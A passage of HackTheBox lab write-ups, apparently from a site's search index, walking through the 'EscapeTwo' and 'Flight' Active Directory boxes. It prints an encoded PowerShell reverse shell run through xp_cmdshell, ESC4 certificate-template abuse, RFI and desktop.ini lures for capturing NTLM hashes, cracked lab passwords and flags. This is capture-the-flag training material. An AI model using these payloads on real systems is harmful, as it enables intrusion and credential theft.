ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb\n| Not valid before: 2024-06-08T17:35:00\n|_Not valid after:  2025-06-08T17:35:00\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb\n| Not valid before: 2024-06-08T17:35:00\n|_Not valid after:  2025-06-08T17:35:00\n|_ssl-date: 2025-06-14T14:36:43+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49706/tcp open  msrpc         Microsoft Windows RPC\n49722/tcp open  msrpc         Microsoft Windows RPC\n49731/tcp open  msrpc         Microsoft Windows RPC\n</code></pre> <p>Rose can read an <code>Accounting Department</code> share.</p> <p></p> <p>Get both files:</p> <pre><code>$ smbclient -U 'rose%KxEPkKe6R8su' //10.10.11.51/\"Accounting department\"\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sun Jun  9 12:52:21 2024\n  ..                                  D        0  Sun Jun  9 12:52:21 2024\n  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024\n  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024\n\n                6367231 blocks of size 4096. 926821 blocks available\nsmb: \\&gt; get accounting_2024.xlsx\ngetting file \\accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (59.4 KiloBytes/sec) (average 59.4 KiloBytes/sec)\nsmb: \\&gt; get accounts.xlsx\ngetting file \\accounts.xlsx of size 6780 as accounts.xlsx (39.9 KiloBytes/sec) (average 49.7 KiloBytes/sec)\n</code></pre> <p>Unzip the <code>.xlsx</code> file to see the sheets.</p> <pre><code>$ unzip accounts.xlsx -d accounts\n$ grep -r Password .\n./xl/sharedStrings.xml:&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"25\" uniqueCount=\"24\"&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;First Name&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Last Name&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Email&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Username&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Password&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Angela&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Martin&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;angela@sequel.htb&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;angela&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;0fwz7Q4mSpurIt99&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Oscar&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Martinez&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;oscar@sequel.htb&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;oscar&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;86LxLBMgEWaKUnBG&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Kevin&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Malone&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;kevin@sequel.htb&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;kevin&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;Md9Wlq1E5bZnVDVo&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;NULL&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;sa@sequel.htb&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;sa&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t xml:space=\"preserve\"&gt;MSSQLP@ssw0rd!&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre> <p><code>angela:0fwz7Q4mSpurIt99</code> <code>oscar:86LxLBMgEWaKUnBG</code> <code>kevin:Md9Wlq1E5bZnVDVo</code> <code>sa:MSSQLP@ssw0rd!</code></p> <p>The valid one was <code>oscar</code>.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/#initial-access","title":"Initial Access","text":"<p>Using <code>impacket-mssqlclient</code>, connect to the database, activate <code>xp_cmdshell</code> and start a reverse shell.</p> <pre><code>$ impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51              \nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\n\nSQL (sa  dbo@master)&gt; enable_xp_cmdshell\nINFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.\nINFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n\nSQL (sa  dbo@master)&gt; xp_cmdshell \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG5nXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAKABzAGUAbgBkAGIAeQB0AGUALAAwACwAcwBlAG4AZABiAHkAdGUALgBMAGUAbgBnAHQAaAApADsAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwBjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\"\n</code></pre> <pre><code>$ rlwrap nc -lnvp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.11.51] 55344\nwhoami\nsequel\\sql_svc\n</code></pre> <p>Inside the <code>SQL2019</code> folder at <code>C:\\</code> there is the <code>sql_svc</code> password.</p> <pre><code>PS C:\\SQL2019\\Expressadv_enu&gt; type sql-configuration.ini\n[OPTIONS]\nACTION=\"Install\"\nQUIET=\"True\"\nFEATURES=SQL\nINSTANCENAME=\"SQLEXPRESS\"\nINSTANCEID=\"SQLEXPRESS\"\nRSSVCACCOUNT=\"NT Service\\ReportServer$SQLEXPRESS\"\nAGTSVCACCOUNT=\"NT AUTHORITY\\NETWORK SERVICE\"\nAGTSVCSTARTUPTYPE=\"Manual\"\nCOMMFABRICPORT=\"0\"\nCOMMFABRICNETWORKLEVEL=\"\"0\"\nCOMMFABRICENCRYPTION=\"0\"\nMATRIXCMBRICKCOMMPORT=\"0\"\nSQLSVCSTARTUPTYPE=\"Automatic\"\nFILESTREAMLEVEL=\"0\"\nENABLERANU=\"False\" \nSQLCOLLATION=\"SQL_Latin1_General_CP1_CI_AS\"\nSQLSVCACCOUNT=\"SEQUEL\\sql_svc\"\nSQLSVCPASSWORD=\"WqSZAF6CysDQbGb3\"\nSQLSYSADMINACCOUNTS=\"SEQUEL\\Administrator\"\nSECURITYMODE=\"SQL\"\nSAPWD=\"MSSQLP@ssw0rd!\"\nADDCURRENTUSERASSQLADMIN=\"False\"\nTCPENABLED=\"1\"\nNPENABLED=\"1\"\nBROWSERSVCSTARTUPTYPE=\"Automatic\"\nIAcceptSQLServerLicenseTerms=True\n</code></pre> <p><code>sql_svc:WqSZAF6CysDQbGb3</code></p> <p>Checking with <code>nxc</code>, we find that <code>ryan</code> uses the same password.</p> <p></p> <p>Using <code>bloodhound</code>, get domain data and upload it.</p> <p><code>ryan</code> has <code>WriteOwner</code> over <code>ca_svc</code>.</p> <p></p> <p>Enter the host as <code>ryan</code>:</p> <pre><code>$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; whoami\nsequel\\ryan\n</code></pre> <p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\desktop&gt; type user.txt\nee6c7ed5773f7158c930971ac4e93020\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/#privilege-escalation","title":"Privilege Escalation","text":"<p><code>ryan</code> has <code>WriteOwner</code> over <code>ca_svc</code>, so first, make <code>ryan</code> the owner. Import <code>PowerView.ps1</code> module.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\desktop&gt; Set-DomainObjectOwner -Identity \"ca_svc\" -OwnerIdentity \"ryan\"\n</code></pre> <p>Now edit the ACL to grant <code>ryan</code> all rights over <code>ca_svc</code>:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\desktop&gt; Add-DomainObjectAcl -Rights 'All' -TargetIdentity \"ca_svc\" -PrincipalIdentity \"ryan\"\n</code></pre> <p>Finally, change the password for <code>ca_svc</code>:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan&gt; $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n*Evil-WinRM* PS C:\\Users\\ryan&gt; Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword\n</code></pre> <p>Now we can use <code>certipy</code> to look for vulnerabilities related to CA:</p> <pre><code>$ certipy-ad find -dc-ip 10.10.11.51 -ns 10.10.11.51 -u ca_svc -p 'Password123!' -vulnerable -stdout\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 15 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'\n[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : sequel-DC01-CA\n    DNS Name                            : DC01.sequel.htb\n    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb\n    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3\n    Certificate Validity Start          : 2024-06-08 16:50:40+00:00\n    Certificate Validity End            : 2124-06-08 17:00:40+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : SEQUEL.HTB\\Administrators\n      Access Rights\n        ManageCa                        : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        ManageCertificates              : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        Enroll                          : SEQUEL.HTB\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : DunderMifflinAuthentication\n    Display Name                        : Dunder Mifflin Authentication\n    Certificate Authorities             : sequel-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : False\n    Certificate Name Flag               : SubjectAltRequireDns\n                                          SubjectRequireCommonName\n    Enrollment Flag                     : PublishToDs\n                                          AutoEnrollment\n    Extended Key Usage                  : Client Authentication\n                                          Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 2\n    Validity Period                     : 1000 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2025-06-14T17:29:27+00:00\n    Template Last Modified              : 2025-06-14T17:29:27+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : SEQUEL.HTB\\Enterprise Admins\n        Full Control Principals         : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Cert Publishers\n        Write Owner Principals          : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Cert Publishers\n        Write Dacl Principals           : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Cert Publishers\n        Write Property Enroll           : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n    [+] User Enrollable Principals      : SEQUEL.HTB\\Cert Publishers\n    [+] User ACL Principals             : SEQUEL.HTB\\Cert Publishers\n    [!] Vulnerabilities\n      ESC4                              : User has dangerous permissions.\n</code></pre> <p>We find <code>ESC4</code> in the <code>DunderMifflinAuthentication</code> template. https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking</p> <p>Update the certificate to make it vulnerable:</p> <pre><code>$ certipy-ad template -dc-ip 10.10.11.51 -u ca_svc -p 'Password12345' -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'\n[*] Updating certificate template 'DunderMifflinAuthentication'\n[*] Successfully updated 'DunderMifflinAuthentication'\n</code></pre> <p>Now get an administrator certificate (do it quickly):</p> <pre><code>$ certipy-ad req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -p 'Password12345' -template DunderMifflinAuthentication -target DC01.sequel.htb -upn administrator@sequel.htb -dns 10.10.11.51\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\\('\n  \"(0x[a-zA-Z0-9]+) \\([-]?[0-9]+ \",\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 16\n[*] Got certificate with multiple identifications\n    UPN: 'administrator@sequel.htb'\n    DNS Host Name: '10.10.11.51'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator_10.pfx'\n</code></pre> <p>Request the TGT ticket:</p> <pre><code>$ certipy-ad auth -pfx administrator_10.pfx \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Found multiple identifications in certificate\n[*] Please select one:\n    [0] UPN: 'administrator@sequel.htb'\n    [1] DNS Host Name: '10.10.11.51'\n&gt; 0\n[*] Using principal: administrator@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff\n</code></pre> <p>Using the hash, enter the host:</p> <pre><code>$ evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nsequel\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n1dbc542372bc5b5f32c76820e430470e\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"flight/","title":"Flight","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"flight/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.187 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 15:57 CEST\nNmap scan report for 10.10.11.187\nHost is up (0.041s latency).\nNot shown: 65517 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)\n|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: g0 Aviation\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-09 20:57:50Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49687/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 6h59m59s\n| smb2-time: \n|   date: 2025-05-09T20:58:43\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT      ADDRESS\n1   41.78 ms 10.10.14.1\n2   41.17 ms 10.10.11.187\n</code></pre> <p>Web page is like a flight planner to order tickets, but nothing works.</p> <p></p> <p>Brute-forcing subdomains, we discover <code>school</code></p> <pre><code>\u2500(kali\u327fkali)-[~/htb/flight]\n\u2514\u2500$ wfuzz -c --hh 7069 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.flight.htb\" http://flight.htb   \n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://flight.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                  \n=====================================================================\n\n000000624:   200        90 L     412 W      3996 Ch     \"school\"                                                                                                 \n\nTotal time: 0\nProcessed Requests: 4989\nFiltered Requests: 4988\nRequests/sec.: 0\n</code></pre> <p>Add it to <code>/etc/hosts</code> and browse it.</p> <p></p> <p>Clicking the tabs shows the full URL and it's worth trying an LFI/RFI.</p> <p>Start <code>responder</code> and use the RFI to get a hash.</p> <pre><code>$ curl http://school.flight.htb/index.php?view=//10.10.14.13/asdf\n</code></pre> <pre><code>$ sudo responder -I tun0               \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0\n\n...\n\n[SMB] NTLMv2-SSP Client   : 10.10.11.187\n[SMB] NTLMv2-SSP Username : flight\\svc_apache\n[SMB] NTLMv2-SSP Hash     : svc_apache::flight:e64f85680080a84d:B9EAA150941D324B74DDA69B2F6ED433:010100000000000080077C0C24C1DB01D76FD0877A0B5DD90000000002000800590048003000580001001E00570049004E002D0043004B0034004200580059004100360047003600590004003400570049004E002D0043004B003400420058005900410036004700360059002E0059004800300058002E004C004F00430041004C000300140059004800300058002E004C004F00430041004C000500140059004800300058002E004C004F00430041004C000700080080077C0C24C1DB0106000400020000000800300030000000000000000000000000300000DF4BE5DE583DF640529B31E0D974B9E02B151C0536FCA24E2782415508869A150A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310033000000000000000000\n</code></pre> <p>We got the hash of <code>svc_apache</code> and using <code>hashcat</code>:</p> <pre><code>$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force   \nhashcat (v6.2.6) starting\n...\nSVC_APACHE::flight:e64f85680080a84d:b9eaa150941d324b74dda69b2f6ed433:010100000000000080077c0c24c1db01d76fd0877a0b5dd90000000002000800590048003000580001001e00570049004e002d0043004b0034004200580059004100360047003600590004003400570049004e002d0043004b003400420058005900410036004700360059002e0059004800300058002e004c004f00430041004c000300140059004800300058002e004c004f00430041004c000500140059004800300058002e004c004f00430041004c000700080080077c0c24c1db0106000400020000000800300030000000000000000000000000300000df4be5de583df640529b31e0d974b9e02b151c0536fca24e2782415508869a150a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:S@Ss!K@*t13\n</code></pre> <pre><code>`svc_apache:S@Ss!K@*t13`\n</code></pre> <p>This user has access to a couple of shared folders.</p> <p></p> <p>The web contains the two web pages and there is nothing in the rest.</p> <p>Enumerate the users and make a list.</p> <pre><code>$ rpcclient -U 'flight/svc_apache'%'S@Ss!K@*t13' //10.10.11.187 \nrpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[S.Moon] rid:[0x642]\nuser:[R.Cold] rid:[0x643]\nuser:[G.Lors] rid:[0x644]\nuser:[L.Kein] rid:[0x645]\nuser:[M.Gold] rid:[0x646]\nuser:[C.Bum] rid:[0x647]\nuser:[W.Walker] rid:[0x648]\nuser:[I.Francis] rid:[0x649]\nuser:[D.Truff] rid:[0x64a]\nuser:[V.Stevens] rid:[0x64b]\nuser:[svc_apache] rid:[0x64c]\nuser:[O.Possum] rid:[0x64d]\n</code></pre> <pre><code>$ cat users | awk -F[][] '{print $2}' | sponge users\n</code></pre> <p>Testing the password, we find that <code>s.moon</code> has the same password as <code>svc_apache</code>.</p> <p></p> <p><code>s.moon</code> can write into the <code>Shared</code> folder. This seems like a client-side attack.</p> <p></p> <p>Create a <code>desktopini</code> file with <code>ntlm_theft</code>.</p> <pre><code>$ python ntlm_theft/ntlm_theft.py -g desktopini -s 10.10.14.13 -f Services\nCreated: Services/desktop.ini (BROWSE TO FOLDER)\nGeneration Complete.\n</code></pre> <p>Put it in the <code>shared</code> folder and start a <code>responder</code>.</p> <pre><code>smb: \\&gt; put desktop.ini\nputting file desktop.ini as \\desktop.ini (0.4 kb/s) (average 0.7 kb/s)\nsmb: \\&gt; exit\n</code></pre> <pre><code>$ sudo responder -I tun0                 \n[sudo] password for kali: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0\n\n\n[SMB] NTLMv2-SSP Client   : 10.10.11.187\n[SMB] NTLMv2-SSP Username : flight.htb\\c.bum\n[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:49d3c2488f1b5079:DA4BBD6802996298134BCCF0AFB11D0C:010100000000000080526DCC2CC1DB01C5B9C27155605D9E0000000002000800500059003300430001001E00570049004E002D0048004C005A005800570051003800300035004B00580004003400570049004E002D0048004C005A005800570051003800300035004B0058002E0050005900330043002E004C004F00430041004C000300140050005900330043002E004C004F00430041004C000500140050005900330043002E004C004F00430041004C000700080080526DCC2CC1DB0106000400020000000800300030000000000000000000000000300000DF4BE5DE583DF640529B31E0D974B9E02B151C0536FCA24E2782415508869A150A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310033000000000000000000                  \n[+] Exiting...\n</code></pre> <p>With <code>hashcat</code>, crack it open.</p> <pre><code>$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force \nhashcat (v6.2.6) starting\n...\nC.BUM::flight.htb:49d3c2488f1b5079:da4bbd6802996298134bccf0afb11d0c:010100000000000080526dcc2cc1db01c5b9c27155605d9e0000000002000800500059003300430001001e00570049004e002d0048004c005a005800570051003800300035004b00580004003400570049004e002d0048004c005a005800570051003800300035004b0058002e0050005900330043002e004c004f00430041004c000300140050005900330043002e004c004f00430041004c000500140050005900330043002e004c004f00430041004c000700080080526dcc2cc1db0106000400020000000800300030000000000000000000000000300000df4be5de583df640529b31e0d974b9e02b151c0536fca24e2782415508869a150a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:Tikkycoll_431012284\n</code></pre> <pre><code>c.bum:Tikkycoll_431012284\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 